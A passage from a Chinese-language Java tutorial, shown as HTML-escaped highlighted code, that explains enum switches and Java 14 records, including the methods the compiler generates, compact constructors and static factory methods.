&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cannot process &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="record">record&lt;/h3>
&lt;p>java14开始&lt;/p>
&lt;ul>
&lt;li>不变类的class和字段都使用&lt;code>final&lt;/code>关键字，无法派生子类，创建实例后无法修改任何字段&lt;/li>
&lt;li>创建不变类后为了保证不变类的比较，还需要正确覆写&lt;code>equals()&lt;/code>和&lt;code>hashCode()&lt;/code>方法，手动覆写很麻烦，可以直接用record一行写出不变类&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后一行相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Point[x=%s, y=%s]&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>除了用&lt;code>final&lt;/code>修饰class以及每个字段外，编译器还自动为我们创建了构造方法，和字段名同名的方法，以及覆写&lt;code>toString()&lt;/code>、&lt;code>equals()&lt;/code>和&lt;code>hashCode()&lt;/code>方法&lt;/p>
&lt;ul>
&lt;li>和&lt;code>enum&lt;/code>类似，我们自己不能直接从&lt;code>Record&lt;/code>派生，只能通过&lt;code>record&lt;/code>关键字由编译器实现继承&lt;/li>
&lt;li>如果要对参数进行检查，可以用Compact Constructor&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译器生成的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这是我们编写的Compact Constructor:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这是编译器继续生成的赋值代码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>作为&lt;code>record&lt;/code>的&lt;code>Point&lt;/code>仍然可以通过&lt;code>of()&lt;/code>添加静态方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
